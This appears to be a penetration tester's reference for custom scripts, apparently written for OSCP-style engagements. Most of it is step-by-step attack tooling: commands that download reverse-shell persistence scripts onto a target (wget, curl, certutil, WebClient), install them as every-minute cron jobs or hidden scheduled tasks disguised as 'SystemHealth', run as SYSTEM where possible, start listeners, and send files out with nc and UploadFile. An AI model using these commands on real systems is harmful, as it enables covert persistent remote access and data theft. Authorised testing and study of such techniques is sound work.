# Custom Scripts Reference

Scripts stored in `10.scripts/`. All scripts are custom-built and should be the first place you look for automation during an engagement.

---

## Scripts at a Glance

| Script | Platform | Purpose |
|---|---|---|
| `revshell_persist.sh` | Linux | Auto reverse shell via cron |
| `revshell_persist.ps1` | Windows | Auto reverse shell via scheduled task |
| `peas_analyzer.py` | Both | Process linpeas/winpeas output into actionable findings |

---

## revshell_persist.sh / revshell_persist.ps1

### Overview

Installs a cron job (Linux) or scheduled task (Windows) that attempts a reverse shell connection every minute. Designed to run in the background so you never need to re-exploit to recover your foothold.

* Checks for an existing connection first — no duplicate shells
* Tries multiple LOTL methods in order until one succeeds
* Also checks common locations for any uploaded custom shell binary (e.g. msfvenom payload)
* Runs as the current user, or SYSTEM if you have an elevated shell when creating the task

**Before deploying:** edit `LHOST` and `LPORT` at the top of the relevant script.

---

### Transfer to target

**Serve files from Kali**
```bash
# From ~/OSCP-Tools (preferred - everything is here)
cd ~/OSCP-Tools && python3 -m http.server 8888

# SMB alternative (useful when HTTP is blocked)
impacket-smbserver share . -smb2support
```

**Download on Linux target**
```bash
wget http://10.10.10.10:8888/10.scripts/revshell_persist.sh -O /tmp/revshell.sh
curl http://10.10.10.10:8888/10.scripts/revshell_persist.sh -o /tmp/revshell.sh

chmod +x /tmp/revshell.sh
```

**Download on Windows target**
```bat
copy \\10.10.10.10\share\10.scripts\revshell_persist.ps1 c:\windows\temp\revshell.ps1
```

```powershell
certutil -urlcache -split -f http://10.10.10.10:8888/10.scripts/revshell_persist.ps1 c:\windows\temp\revshell.ps1

Invoke-WebRequest -Uri http://10.10.10.10:8888/10.scripts/revshell_persist.ps1 -OutFile c:\windows\temp\revshell.ps1

(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10:8888/10.scripts/revshell_persist.ps1","c:\windows\temp\revshell.ps1")
```

---

### Create the repeating task

#### Linux — Cron

**User cron (no root needed)**
```bash
crontab -e
# Add this line:
* * * * * /tmp/revshell.sh >/dev/null 2>&1
```

**System-wide cron (requires root)**
```bash
echo '* * * * * root /tmp/revshell.sh >/dev/null 2>&1' >> /etc/crontab

# Or as a file in /etc/cron.d
cat > /etc/cron.d/revshell <<EOF
* * * * * root /tmp/revshell.sh >/dev/null 2>&1
EOF
```

**Drop into cron.minutely if it exists**
```bash
cp /tmp/revshell.sh /etc/cron.minutely/revshell
```

#### Windows — Scheduled Task

**As current user**
```bat
schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\windows\temp\revshell.ps1" /sc minute /mo 1 /f
```

**As SYSTEM (requires elevated shell)**
```bat
schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\windows\temp\revshell.ps1" /sc minute /mo 1 /ru SYSTEM /f
```

---

### Start listener on Kali

```bash
# Standard (use listen() function from .zshrc)
listen 4444

# pwncat (better shell handling - full TTY, auto-upgrade)
pwncat-cs -lp 4444
```

```bash
# Metasploit multi/handler (Linux payload)
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"

# Metasploit multi/handler (Windows payload)
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"
```

**Auto-restart listener — useful when expecting multiple reconnects**
```bash
#!/bin/bash
LPORT=4444
while true; do
    echo "[*] Starting listener on port $LPORT"
    rlwrap nc -nvlp $LPORT
    echo "[*] Connection closed, restarting..."
    sleep 2
done
```

---

### Testing

Test manually first (with listener running):
```bash
bash /tmp/revshell.sh
```

**Confirm cron is running**
```bash
systemctl status cron
systemctl status crond    # RHEL/CentOS
```

**Watch cron logs**
```bash
tail -f /var/log/syslog | grep CRON
tail -f /var/log/cron
```

**Temporary logging to debug a misfiring script**
```bash
# Replace the crontab entry with:
* * * * * /tmp/revshell.sh > /tmp/revshell.log 2>&1
```

**Confirm Windows scheduled task created and firing**
```bat
schtasks /query /tn "SystemHealth"
```

---

### Cleanup

**Linux — remove cron job**
```bash
crontab -e    # delete the line manually

# If you used /etc/cron.d:
rm /etc/cron.d/revshell
```

**Windows — remove scheduled task**
```bat
schtasks /delete /tn "SystemHealth" /f
```

---

### Troubleshooting

* **Script runs but no connection** — check LHOST/LPORT are correct and listener is running *before* the task fires
* **Cron fires but script does nothing** — use the logging entry above and check `/tmp/revshell.log`; PATH issues are common in cron environments (binaries may not be in PATH)
* **Windows task created but not firing** — run `schtasks /query /tn "SystemHealth"` and check last run time and status
* **Duplicate shells** — connection-check logic relies on `ss`/`netstat`; if both are unavailable the guard won't work and you may get multiple shells

---

## peas_analyzer.py

### Overview

Processes linpeas or winpeas output and extracts actionable findings grouped by severity. Designed to cut through PEAS noise and surface the most likely privesc paths — most useful when you've completed manual enumeration and want a second pass before trying more speculative techniques.

* Auto-detects Linux vs Windows PEAS output
* Covers CRITICAL / HIGH / MEDIUM / INFO severity tiers
* Colour-coded terminal output — red/yellow/cyan by severity
* Auto-saves a timestamped plain-text findings file to current directory
* `--raw` flag shows the matched source line under each finding (useful for false positive debugging)

**Note:** Pattern coverage will improve over time as you use it against real boxes. False positives and missed findings are expected early on — tune the patterns in the script as you go.

---

### Usage

**Process a saved file**
```bash
python3 peas_analyzer.py linpeas_output.txt
python3 peas_analyzer.py winpeas_output.txt
```

**Pipe output directly**
```bash
./linpeas.sh | python3 peas_analyzer.py
cat linpeas_output.txt | python3 peas_analyzer.py
```

**Show raw matched lines (for debugging)**
```bash
python3 peas_analyzer.py linpeas_output.txt --raw
```

---

### Capturing PEAS output to a file

If you want to save PEAS output for later processing or to transfer back to Kali:

**Linux target**
```bash
# Save to file (strips colour codes automatically on some systems)
./linpeas.sh > /tmp/linpeas_out.txt 2>&1

# Preserve colour codes (peas_analyzer strips them anyway)
./linpeas.sh | tee /tmp/linpeas_out.txt
```

**Windows target**
```powershell
# Save winpeas output (bat version)
winPEAS.bat > c:\windows\temp\winpeas_out.txt

# Save winpeas output (exe version)
.\winpeasx64.exe > c:\windows\temp\winpeas_out.txt
.\winpeasx64.exe | Out-File c:\windows\temp\winpeas_out.txt
```

**Transfer output back to Kali**
```bash
# From Linux target (if nc available)
nc 10.10.10.10 9001 < /tmp/linpeas_out.txt

# Listener on Kali
nc -nvlp 9001 > linpeas_out.txt
```

```powershell
# From Windows target
(New-Object System.Net.WebClient).UploadFile("http://10.10.10.10:8888/upload", "c:\windows\temp\winpeas_out.txt")
```

---

### Severity tiers

| Tier | Meaning | Examples |
|---|---|---|
| CRITICAL | Exploit immediately | SeImpersonatePrivilege, NOPASSWD sudo, writable /etc/passwd, AlwaysInstallElevated |
| HIGH | Likely privesc path | Writable service, cap_setuid, LD_PRELOAD, readable SSH key, old sudo version |
| MEDIUM | Worth investigating | Localhost-only services, interesting files, Docker socket, group memberships |
| INFO | Context only | OS version, hostname, already root |

---

### Output files

The script writes a `findings_<source>_<timestamp>.txt` file to your current directory on every run. These include the full finding list (not capped like the terminal output) plus the raw matched lines. Useful for:

* Referencing later without re-running
* Pasting into exam notes
* Comparing findings across multiple runs

---

### Tuning the patterns

Patterns live at the top of `peas_analyzer.py` in `CRITICAL_PATTERNS`, `HIGH_PATTERNS`, `MEDIUM_PATTERNS`, and `INFO_PATTERNS`. Each entry is a tuple of `(regex_pattern, description)`.

To add a new pattern:
```python
# In HIGH_PATTERNS:
(r'your regex here', 'Human readable description of the finding'),
```

Common reasons to tune:
* False positives — tighten the regex
* Missed findings — add the pattern you noticed in a real PEAS run
* New CVEs — add a version-specific pattern to CRITICAL

---
